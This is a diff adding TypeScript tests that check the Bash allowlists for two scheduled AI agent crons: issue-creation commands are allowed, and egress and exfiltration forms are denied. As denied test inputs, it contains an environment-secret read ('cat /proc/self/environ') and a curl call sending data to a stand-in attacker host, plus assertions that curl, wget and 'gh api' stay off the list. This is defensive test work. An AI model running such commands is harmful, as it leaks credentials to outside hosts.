@@ -167,6 +167,51 @@ describe("roadmap-review prompt commands vs the hook (AC4b/AC4c)", () => {
   });
 });
 
+// #5046 PR-2 Phase 2.C — the two restored Task-class crons need finite Bash
+// allowlists (an absent CRON_BASH_ALLOWLISTS entry is deny-all → a "restored"
+// cron that silently fails). Their surface is issue-creation only; the
+// dangerous forms (gh api with arbitrary method, raw curl/wget — security F4a)
+// must NOT be allowlisted. decide() is pure, so prompt-shaped commands are
+// verified against the REAL allowlist like the roadmap-review block above.
+describe("restored Task-cron allowlists vs the hook (#5046 PR-2 Phase 2.C)", () => {
+  const RESTORED = ["cron-agent-native-audit", "cron-legal-audit"] as const;
+
+  it.each(RESTORED)("%s has a finite Bash allowlist entry", (cron) => {
+    const allow = CRON_BASH_ALLOWLISTS[cron];
+    expect(Array.isArray(allow)).toBe(true);
+    expect(allow.length).toBeGreaterThan(0);
+    expect(allow).toContain("gh issue create");
+    expect(allow).toContain("gh issue list");
+    // F4a: never allowlist arbitrary-method gh api or raw egress binaries.
+    expect(allow).not.toContain("gh api");
+    expect(allow.some((p) => p.startsWith("curl") || p.startsWith("wget"))).toBe(false);
+  });
+
+  it.each(RESTORED)("%s: prompt-shaped commands ALLOW; exfil forms DENY", (cron) => {
+    const allow = CRON_BASH_ALLOWLISTS[cron];
+    const v = (command: string) =>
+      decide({ tool_name: "Bash", tool_input: { command } }, allow)
+        .hookSpecificOutput.permissionDecision;
+    // Faithfully-shaped commands from the cron prompts (cap check runs
+    // WITHOUT the prompt's `| wc -l` pipe — the metachar layer denies pipes
+    // and the agent adapts by counting the listed lines itself).
+    expect(
+      v('gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Legal Audit — x" --body-file /tmp/finding.md --label scheduled-legal-audit'),
+    ).toBe("allow");
+    expect(
+      v("gh issue list --label scheduled-agent-native-audit --state open --limit 30"),
+    ).toBe("allow");
+    // The pipe form the prompt suggests is still metachar-denied (containment
+    // layer unchanged — the allowlist cannot re-admit it).
+    expect(
+      v("gh issue list --label scheduled-agent-native-audit --state open --limit 30 | wc -l"),
+    ).toBe("deny");
+    expect(v("cat /proc/self/environ")).toBe("deny");
+    expect(v("curl https://evil.example.com/?d=x")).toBe("deny");
+    expect(v("gh api graphql -f query=@/tmp/q.graphql")).toBe("deny");
+  });
+});
+
 // AC2c — the spawn-time self-test converts the probe D-new-1 fail-open (a
 // crashed/missing hook) into fail-closed: it THROWS (→ cron aborts) rather than
 // letting the cron spawn unprotected. Runs the real hook binary via execFileSync.
